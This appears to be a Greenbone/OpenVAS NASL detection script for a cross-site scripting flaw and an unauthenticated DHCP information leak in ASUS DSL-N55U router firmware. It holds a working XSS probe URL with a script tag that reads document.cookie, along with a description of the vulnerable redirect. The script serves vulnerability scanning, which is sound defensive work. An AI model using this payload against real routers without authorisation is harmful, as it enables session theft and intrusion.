if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.808240" );
	script_version( "2021-08-10T15:24:26+0000" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2021-08-10 15:24:26 +0000 (Tue, 10 Aug 2021)" );
	script_tag( name: "creation_date", value: "2016-06-29 17:04:23 +0530 (Wed, 29 Jun 2016)" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_name( "ASUS DSL-N55U Router Cross Site Scripting And Information Disclosure Vulnerabilities" );
	script_tag( name: "summary", value: "The host is running ASUS DSL-N55U Router
  and is prone to cross site scripting and information disclosure
  vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to execute arbitrary script or not." );
	script_tag( name: "insight", value: "Multiple flaws are due to:

  - An insufficient validation of user supplied input for the 'web path' in the
    'httpd' binary, which redirect a user to the 'cloud_sync.asp' page with the
    web path as a value of a GET parameter.

  - An unauthenticated access to DHCP information of the local machines connected
  to the router from the WAN IP address." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to inject arbitrary web script into user's browser session and also
  to retrieve DHCP information including the hostname and private IP addresses of
  the local machines." );
	script_tag( name: "affected", value: "ASUS DSL-N55U router firmware
  version 3.0.0.4.376_2736" );
	script_tag( name: "solution", value: "Upgrade to ASUS DSL-N55U router firmware
  version 3.0.0.4_380_3679 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://seclists.org/bugtraq/2016/Jun/97" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/538745" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_mandatory_keys( "DSL-N55U/banner" );
	script_require_ports( "Services/www", 8080 );
	script_xref( name: "URL", value: "https://www.asus.com" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
http_port = http_get_port( default: 8080 );
banner = http_get_remote_headers( port: http_port );
if(!ContainsString( banner, "WWW-Authenticate: Basic realm=\"DSL-N55U" )){
	exit( 0 );
}
url = "/111111111111111111111111111111111111111<script>alert(document.cookie)</script>";
if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "<script>alert\\(document.cookie\\)</script>", extra_check: make_list( "cloud_sync.asp\\?flag",
	 ">location" ) )){
	report = http_report_vuln_url( port: http_port, url: url );
	security_message( port: http_port, data: report );
	exit( 0 );
}

